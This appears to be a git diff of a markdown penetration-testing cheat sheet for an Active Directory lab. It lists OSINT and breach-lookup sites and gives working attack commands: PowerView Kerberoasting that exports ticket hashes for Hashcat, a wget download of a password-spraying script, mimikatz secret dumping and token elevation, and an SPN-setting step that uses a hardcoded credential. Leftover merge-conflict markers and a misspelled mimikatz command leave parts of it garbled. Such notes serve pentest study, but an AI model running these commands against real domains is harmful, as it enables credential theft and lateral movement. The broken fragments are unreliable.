@@ -9,10 +9,15 @@
 ### Where to look  
 
 [DomainTools](https://whois.domaintools.com/)
+
 [PTR-Arcive](https://www.whatsmydns.net/dns-lookup/ptr-records)
+
 [TruffleHog](https://github.com/trufflesecurity/truffleHog)
+
 [Linkedin2Username](https://github.com/initstring/linkedin2username)
+
 [DeHashed](https://dehashed.com/search#breachCheck)
+
 [HaveIBeenPwned](https://haveibeenpwned.com/)
 - Public Websites 
 - Google Dorking
@@ -151,14 +156,14 @@ Find Computers where Domain Users are Local Admin
 
 ### Lateral Movement 
 
-** Kerberoasting ** 
+**Kerberoasting** 
 ```
 Import-Module .\PowerView.ps1
 Get-DomainUser * -SPN |Select samaccountname
 Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
 ```
 
-** Password Spraying**
+**Password Spraying**
 
 ```
 wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
@@ -167,8 +172,12 @@ tag:lateral-movement
 
 ```
 
+<<<<<<< HEAD
 ** Pillaging** 
 
+=======
+**Pillaging** 
+>>>>>>> 3629eb7836b426008e6f682f73859bad98ae31f6
 ```
 mimikatz.exe 
 lasadump::secrets
@@ -179,4 +188,7 @@ token::elevate
 $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
 Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
+<<<<<<< HEAD
 ```
+=======
+>>>>>>> 3629eb7836b426008e6f682f73859bad98ae31f6
